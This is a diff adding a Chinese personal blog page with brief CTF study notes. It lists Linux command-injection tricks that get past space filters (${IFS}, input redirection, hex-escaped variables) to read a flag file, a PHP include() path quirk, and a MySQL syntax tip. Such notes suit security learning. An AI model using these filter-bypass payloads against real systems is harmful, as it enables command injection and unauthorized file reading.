@@ -1,0 +1,195 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2023/12/08 小记 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2023/12/08 小记 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="针对与Linux操作系统rce空格绕过如下
+    cat${IFS}flag.txt
+    cat$IFS$9flag.txt
+    cat&lt;flag.txt
+    cat&lt;&gt;flag.txt
+    ca\t f..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2023/12/08 小记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-08
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="针对与linux操作系统rce空格绕过如下">针对与Linux操作系统rce空格绕过如下</h2>
+<pre><code>    cat${IFS}flag.txt
+    cat$IFS$9flag.txt
+    cat&lt;flag.txt
+    cat&lt;&gt;flag.txt
+    ca\t fl\ag
+    kg=$ '\x20flag.txt' &amp;&amp;cat$kg              **新学一招**
+    (\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过)
+</code></pre>
+<h2 id="关于php-中include函数的特性">关于php 中include()函数的特性</h2>
+<p>根据include函数的功能，以字符‘/’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件--注意是最后一个/。<br>
+例子:</p>
+<pre><code>    include(qwert/flag.php);       //若qwert不存在当前目录而flag.php存在当前录,这会包含flag.php
+</code></pre>
+<h2 id="关于mysql语法">关于mysql语法</h2>
+<pre><code>    当某字段名为纯数字时, 在使用时要用反引号包裹起来
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E9%92%88%E5%AF%B9%E4%B8%8Elinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Frce%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E5%A6%82%E4%B8%8B">针对与Linux操作系统rce空格绕过如下</a></li>
+<li><a href="#%E5%85%B3%E4%BA%8Ephp-%E4%B8%ADinclude%E5%87%BD%E6%95%B0%E7%9A%84%E7%89%B9%E6%80%A7">关于php 中include()函数的特性</a></li>
+<li><a href="#%E5%85%B3%E4%BA%8Emysql%E8%AF%AD%E6%B3%95">关于mysql语法</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/javascript-yuan-xing-lian-wu-ran/">
+              <h3 class="post-title">
+                JavaScript原型链污染
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
